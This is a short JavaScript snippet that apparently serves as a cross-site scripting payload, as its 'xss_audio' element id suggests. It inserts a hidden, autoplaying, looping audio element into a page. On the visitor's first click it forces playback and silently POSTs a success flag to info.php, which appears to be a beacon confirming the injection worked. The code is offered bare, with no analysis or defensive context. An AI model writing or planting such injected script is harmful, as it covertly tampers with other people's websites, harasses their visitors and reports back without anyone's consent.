function play(voice){
    if(document.getElementById('xss_audio') == null ) {
        var a = document.createElement('audio');
        a.src = voice
        a.autoplay=true;
        a.loop=true;
        a.id='xss_audio';
        a.style.display='none';
        document.body.appendChild(a);
        document.body.addEventListener("click",function(){
            a.play()
            ok = "OK"
            $.ajax({
                type: 'POST',
                url: 'info.php',
                data: {succ:ok},
                mimeType: 'text'
                });
        })
    }
}